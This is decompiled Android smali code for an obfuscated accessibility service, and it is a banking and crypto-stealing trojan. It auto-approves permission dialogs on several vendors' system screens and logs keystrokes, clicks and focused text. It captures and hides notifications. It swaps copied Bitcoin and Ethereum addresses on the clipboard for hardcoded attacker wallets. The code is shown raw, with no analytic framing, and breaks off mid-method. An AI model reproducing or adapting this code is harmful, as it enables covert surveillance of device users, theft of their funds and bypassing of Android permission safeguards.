.class public final Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;
.super Landroid/accessibilityservice/AccessibilityService;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo$a;
    }
.end annotation


# static fields
.field public static q:Z

.field public static r:Z


# instance fields
.field public final b:Ljava/text/DateFormat;

.field public c:Z

.field public d:Ljava/lang/String;

.field public e:Ljava/lang/String;

.field public f:Ljava/lang/String;

.field public g:Ljava/lang/String;

.field public h:Ljava/lang/String;

.field public i:Ljava/lang/String;

.field public j:Lz0/s0;

.field public k:Ly0/c;

.field public l:Ly0/c;

.field public m:Ly0/c;

.field public final n:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field public o:I

.field public p:I


# direct methods
.method public constructor <init>()V
    .locals 4

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 1
    sget-object v0, Lb0/b;->n:Ljava/lang/Class;

    .line 2
    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    const-string v1, " >> "

    invoke-static {v0, v1}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "MM/dd/yyyy, HH:mm:ss z"

    sget-object v2, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-direct {v0, v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->b:Ljava/text/DateFormat;

    const-string v0, ""

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;

    const-string v1, "0"

    iput-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->e:Ljava/lang/String;

    sget-object v1, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    const-string v2, "MANUFACTURER"

    invoke-static {v1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    const-string v3, "ROOT"

    invoke-static {v2, v3}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "(this as java.lang.String).toLowerCase(locale)"

    invoke-static {v1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    new-instance v0, Ly0/c;

    const-string v1, "\\\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}"

    invoke-direct {v0, v1}, Ly0/c;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->k:Ly0/c;

    new-instance v0, Ly0/c;

    const-string v1, "\\\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}"

    invoke-direct {v0, v1}, Ly0/c;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l:Ly0/c;

    new-instance v0, Ly0/c;

    const-string v1, "\\\\b(0x)?[0-9a-fA-F]{40}"

    invoke-direct {v0, v1}, Ly0/c;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->m:Ly0/c;

    const/4 v0, 0x5

    new-array v0, v0, [Ljava/lang/String;

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    const-string v2, ":id/permission_allow_button"

    invoke-static {v1, v2}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "com.android.packageinstaller:id/permission_allow_button"

    const/4 v2, 0x1

    aput-object v1, v0, v2

    const-string v1, "com.android.permissioncontroller:id/permission_allow_button"

    const/4 v2, 0x2

    aput-object v1, v0, v2

    const-string v1, "com.miui.securitycenter:id/accept"

    const/4 v2, 0x3

    aput-object v1, v0, v2

    const-string v1, "com.android.settings:id/action_button"

    const/4 v2, 0x4

    aput-object v1, v0, v2

    invoke-static {v0}, Lb/a;->a([Ljava/lang/Object;)Ljava/util/ArrayList;

    move-result-object v0

    iput-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n:Ljava/util/ArrayList;

    return-void
.end method

.method public static synthetic o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V
    .locals 0

    and-int/lit8 p3, p3, 0x2

    if-eqz p3, :cond_0

    const/4 p2, 0x0

    :cond_0
    invoke-virtual {p0, p1, p2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    return-void
.end method


# virtual methods
.method public final A(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;)Z
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            "Ljava/util/List<",
            "Ljava/lang/String;",
            ">;)Z"
        }
    .end annotation

    const/4 v0, 0x0

    if-eqz p1, :cond_6

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {p2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    const/4 v5, 0x1

    if-eqz v4, :cond_3

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    if-nez v2, :cond_1

    goto :goto_0

    :cond_1
    const/4 v6, 0x2

    invoke-static {v2, v4, v0, v6}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v4

    if-ne v4, v5, :cond_2

    move v4, v5

    goto :goto_1

    :cond_2
    :goto_0
    move v4, v0

    :goto_1
    if-eqz v4, :cond_0

    invoke-virtual {p0, p1, v0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    move-result v4

    if-eqz v4, :cond_0

    sget-object p1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v0, 0x96

    invoke-virtual {p1, v0, v1}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    sget-object p1, Lb0/b;->a:Lb0/b;

    return v5

    :cond_3
    if-lez v1, :cond_6

    move v2, v0

    :goto_2
    add-int/lit8 v3, v2, 0x1

    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {p0, v2, p2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->A(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;)Z

    move-result v2

    if-eqz v2, :cond_4

    return v5

    :cond_4
    if-lt v3, v1, :cond_5

    goto :goto_3

    :cond_5
    move v2, v3

    goto :goto_2

    :cond_6
    :goto_3
    return v0
.end method

.method public final B(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 5

    if-eqz p1, :cond_5

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    const/4 v3, 0x0

    if-nez v1, :cond_1

    :cond_0
    move v2, v3

    goto :goto_0

    :cond_1
    const/4 v4, 0x2

    invoke-static {v1, p2, v3, v4}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v1

    if-ne v1, v2, :cond_0

    :goto_0
    if-eqz v2, :cond_2

    return-object p1

    :cond_2
    if-lez v0, :cond_5

    :goto_1
    add-int/lit8 v1, v3, 0x1

    invoke-virtual {p1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {p0, v2, p2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->B(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_3

    return-object v2

    :cond_3
    if-lt v1, v0, :cond_4

    goto :goto_2

    :cond_4
    move v3, v1

    goto :goto_1

    :cond_5
    :goto_2
    const/4 p1, 0x0

    return-object p1
.end method

.method public final C(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 3

    .line 1
    :try_start_0
    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->b:Ljava/text/DateFormat;

    .line 2
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result p1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    const/4 v2, 0x1

    if-eq p1, v2, :cond_3

    const/4 v2, 0x4

    if-eq p1, v2, :cond_2

    const/16 v2, 0x8

    if-eq p1, v2, :cond_1

    const/16 v2, 0x10

    if-eq p1, v2, :cond_0

    :try_start_1
    iget-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/4 v2, 0x3

    if-lt p1, v2, :cond_4

    const-string p1, "time"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "action"

    const-string v0, "[KeyLog]"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "length"

    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const-string p1, "text"

    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto/16 :goto_2

    :catchall_0
    move-exception p1

    :try_start_2
    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    goto/16 :goto_2

    :cond_0
    const-string p1, "time"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "action"

    const-string v0, "[Write Text]"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "eDZVaVluNWUvQ1pabHJOZUxJRE1hdz09OjpBc1BnbG5nS3dDUVB1bEF5U2RnV2JnPT0="

    :goto_0
    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    goto :goto_1

    :cond_1
    const-string p1, "time"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "action"

    const-string v0, "[Focused]"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "SGx5V3plYWhiQSswemNpcEl1V0F1UT09OjppQ1B1TW9ieFc1dXdmckJmZnBzYmVRPT0="

    goto :goto_0

    :cond_2
    const-string p1, "time"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "action"

    const-string v0, "[Selected]"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "a3hFcnJ1TVVQNEZuZmlWdTQ2azYrUT09OjpWTzJFNjZYY1d1eXBzTTBiNlo2cFB3PT0="

    goto :goto_0

    :cond_3
    const-string p1, "time"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "action"

    const-string v0, "[Click]"

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p1, "UmdVOEtqMzFvWVBHYlF4aHlESTIwdz09OjprYnZIVHpkZ2RIVTF6eUVtK3o0cWV3PT0="

    goto :goto_0

    :goto_1
    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    invoke-virtual {v1, p1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :cond_4
    :goto_2
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p1

    const/4 v0, 0x2

    if-le p1, v0, :cond_5

    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 3
    sget-object p1, Lb0/b;->T:Ljava/lang/String;

    .line 4
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, "::endlog::"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, p1, v0}, Ls0/c;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    goto :goto_3

    :catchall_1
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_5
    :goto_3
    return-void
.end method

.method public final D()Z
    .locals 5

    const-string v0, ""

    const/4 v1, 0x0

    .line 1
    :try_start_0
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "killApplication"

    invoke-interface {v2, v3, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_0

    move-object v2, v0

    .line 2
    :cond_0
    invoke-interface {v2}, Ljava/lang/CharSequence;->length()I

    move-result v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v3, 0x1

    if-lez v2, :cond_1

    move v2, v3

    goto :goto_0

    :cond_1
    move v2, v1

    :goto_0
    if-eqz v2, :cond_3

    :try_start_1
    const-string v2, "android"

    const-string v4, "button1"

    invoke-virtual {p0, v2, v4, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-nez v2, :cond_2

    const-string v2, "com.android.settings"

    const-string v4, "action_button"

    invoke-virtual {p0, v2, v4, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-nez v2, :cond_2

    const-string v2, "com.android.settings"

    const-string v4, "left_button"

    invoke-virtual {p0, v2, v4, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 3
    :cond_2
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v4, "killApplication"

    invoke-interface {v2, v4, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    return v3

    :catch_0
    move-exception v0

    .line 4
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Exception;->getLocalizedMessage()Ljava/lang/String;

    .line 5
    sget-object v0, Lb0/b;->a:Lb0/b;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception v0

    .line 6
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_3
    :goto_1
    return v1
.end method

.method public final E()V
    .locals 4

    :try_start_0
    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    const-string v1, "com.miui.powerkeeper"

    invoke-static {v0, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lh0/a;->a:Lh0/a;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "applicationContext"

    invoke-static {v1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lh0/a;->p(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v1, "android:id/title"

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const-string v1, "rootInActiveWindow.findA\u2026lkZW12aU8yT3dLMnc9PQ==\"))"

    invoke-static {v0, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_0
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    move-object v3, v2

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-virtual {v1, v2}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_0

    :cond_1
    invoke-static {v1}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_2

    goto :goto_1

    :cond_2
    invoke-virtual {p0, v0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    .line 1
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v1, "cntPowerKeeperClick"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    add-int/lit8 v0, v0, 0x1

    .line 2
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "cntPowerKeeperClick"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception v0

    .line 3
    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_3
    :goto_1
    return-void
.end method

.method public final F(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 5

    .line 1
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v1, "clFvdVRCeDBiL1JGL1VRUXhpQ0xYUT09OjpGVmk1VWp3bTVyQ2JYSzB0WHlxV29nPT0="

    const-string v2, ""

    invoke-static {v0, v1, v2}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    move-object v0, v2

    .line 2
    :cond_0
    const-string v1, "1"

    invoke-static {v0, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    if-nez v1, :cond_1

    const/4 v1, 0x0

    goto :goto_0

    :cond_1
    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    :goto_0
    invoke-static {v0, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getParcelableData()Landroid/os/Parcelable;

    move-result-object p1

    instance-of v0, p1, Landroid/app/Notification;

    if-eqz v0, :cond_2

    check-cast p1, Landroid/app/Notification;

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "package"

    iget-object v3, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "ticker"

    iget-object v3, p1, Landroid/app/Notification;->tickerText:Ljava/lang/CharSequence;

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "notification"

    iget-object v3, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "text"

    iget-object v3, p1, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v4, "android.text"

    invoke-virtual {v3, v4}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v1, -0x1

    iput v1, p1, Landroid/app/Notification;->visibility:I

    sget-object p1, Lc0/b;->a:Lc0/b;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "obj.toString()"

    invoke-static {v0, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v1, "pushlist"

    invoke-virtual {p1, p0, v2, v0, v1}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_1

    :catchall_0
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_2
    :goto_1
    return-void
.end method

.method public final G(Landroid/content/ClipboardManager;Ljava/lang/String;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 4

    const-string v0, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v1

    const/16 v2, 0x10

    if-ne v1, v2, :cond_2

    const/high16 v1, 0x200000

    .line 1
    :try_start_0
    iget-object v2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->m:Ly0/c;

    .line 2
    invoke-virtual {v2, p2}, Ly0/c;->a(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 3
    iget-object v2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->m:Ly0/c;

    .line 4
    const-string v3, "0x3Cf7d4A8D30035Af83058371f0C6D4369B5024Ca"

    invoke-virtual {v2, p2, v3}, Ly0/c;->b(Ljava/lang/CharSequence;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v2}, Landroid/content/ClipData;->newPlainText(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/content/ClipData;

    move-result-object v3

    invoke-virtual {p1, v3}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    new-instance v3, Landroid/os/Bundle;

    invoke-direct {v3}, Landroid/os/Bundle;-><init>()V

    invoke-virtual {v3, v0, v2}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2, v1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-void

    :catchall_0
    move-exception v2

    invoke-static {v2}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    .line 5
    :cond_0
    :try_start_1
    iget-object v2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->k:Ly0/c;

    .line 6
    invoke-virtual {v2, p2}, Ly0/c;->a(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 7
    iget-object v2, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->k:Ly0/c;

    .line 8
    const-string v3, "bc1ql34xd8ynty3myfkwaf8jqeth0p4fxkxg673vlf"

    invoke-virtual {v2, p2, v3}, Ly0/c;->b(Ljava/lang/CharSequence;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2, v2}, Landroid/content/ClipData;->newPlainText(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/content/ClipData;

    move-result-object v3

    invoke-virtual {p1, v3}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    new-instance v3, Landroid/os/Bundle;

    invoke-direct {v3}, Landroid/os/Bundle;-><init>()V

    invoke-virtual {v3, v0, v2}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

